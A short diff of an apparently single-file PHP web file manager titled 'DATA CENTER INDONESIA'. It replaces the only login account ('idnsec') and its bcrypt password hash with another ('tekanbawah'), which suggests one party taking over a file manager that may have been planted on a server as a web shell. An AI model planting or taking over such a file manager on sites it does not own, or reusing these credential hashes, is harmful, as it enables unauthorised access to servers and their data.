@@ -23,7 +23,7 @@ define('APP_TITLE', 'DATA CENTER INDONESIA');
 // Is independent from IP white- and blacklisting
 $use_auth = true;
 $auth_users = array(
-    'idnsec' => '$2y$10$VtpB0EgQB0ZemuJtVd7ZiuD0r/oEP2cuNfk21CeiHnVizkZCsYsDK', 
+    'tekanbawah' => '$2y$10$KBMZySUMGjpcBnJuAuBt/OnE34IJD.rorOWC0PQbg4cMcRAY0AEbW', 
 );
 
 // Readonly users
@@ -4292,5 +4292,6 @@ function lng($txt) {
     else if (isset($tr['en'][$txt])) return fm_enc($tr['en'][$txt]);
     else return "$txt";
 }
+
 
 ?>
